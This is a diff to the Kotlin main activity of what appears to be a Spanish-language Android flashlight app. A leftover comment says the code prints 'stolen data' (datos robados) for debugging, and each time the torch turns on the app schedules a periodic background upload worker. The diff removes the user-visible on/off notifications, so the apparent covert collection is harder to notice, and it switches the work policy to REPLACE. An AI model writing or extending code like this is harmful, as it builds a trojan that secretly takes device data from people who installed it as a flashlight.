@@ -7,10 +7,6 @@ import android.content.Context
 import android.hardware.camera2.CameraManager
 import android.os.Build
 import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
-import androidx.core.app.NotificationCompat
-import androidx.core.app.NotificationManagerCompat
 import androidx.appcompat.app.ActionBar
 import androidx.appcompat.app.AppCompatActivity
 import android.util.Log
@@ -33,27 +29,6 @@ class MainActivity : AppCompatActivity() {
         val button2 = findViewById<ImageView>(R.id.boton2)
         button2.visibility = INVISIBLE
 
-        // Codigo relaccionado con las notificaciones:
-        // https://developer.android.com/training/notify-user/build-notification?hl=es-419
-        // Contruye la notificacion, es decir, imagenes, textos, intent, etc.
-        val builderEncendida = NotificationCompat.Builder(this, "1")
-            .setSmallIcon(R.drawable.linterna)
-            .setContentTitle("LinternApp")
-            .setContentText("La linterna está encendida!")
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-            //.setContentIntent(pendingIntent)
-            .setAutoCancel(false)
-            .setOngoing(true) // Esta linea hace que el usuario no pueda cerrar la notificacion
-
-        val builderApagada = NotificationCompat.Builder(this, "1")
-            .setSmallIcon(R.drawable.linterna)
-            .setContentTitle("LinternApp")
-            .setContentText("La linterna está apagada!")
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-            //.setContentIntent(pendingIntent)
-            .setAutoCancel(false)
-            .setOngoing(true) // Esta linea hace que el usuario no pueda cerrar la notificacion
-
         createNotificationChannel() // Canal de comunicacion de notificaciones necesario en API 26+
 
         // Cuando la linterna está encendida
@@ -67,11 +42,6 @@ class MainActivity : AppCompatActivity() {
                 try {
                     camManager.setTorchMode(cameraId, true)
 
-                    // Envia la notificacion construida previamente
-                    with(NotificationManagerCompat.from(this)) {
-                        notify(1, builderEncendida.build())
-                    }
-
                     // Imprime los datos robados para debug
 
                     Log.d("TAG",getSpec())
@@ -81,7 +51,7 @@ class MainActivity : AppCompatActivity() {
                     val myWorkBuilder = PeriodicWorkRequest.Builder(UploadWorker::class.java, PeriodicWorkRequest.MIN_PERIODIC_INTERVAL_MILLIS+1, TimeUnit.MILLISECONDS)
 
                     val myWork = myWorkBuilder.build()
-                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.KEEP, myWork)
+                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.REPLACE, myWork)
 
 
                 }
@@ -100,10 +70,6 @@ class MainActivity : AppCompatActivity() {
                 val cameraId = camManager.cameraIdList[0]
                 try {
                     camManager.setTorchMode(cameraId, false)
-                    // Envia la notificacion construida previamente
-                    with(NotificationManagerCompat.from(this)) {
-                        notify(1, builderApagada.build())
-                    }
                 }
                 catch (e: Exception){
                     print("Error al encontrar el flash")
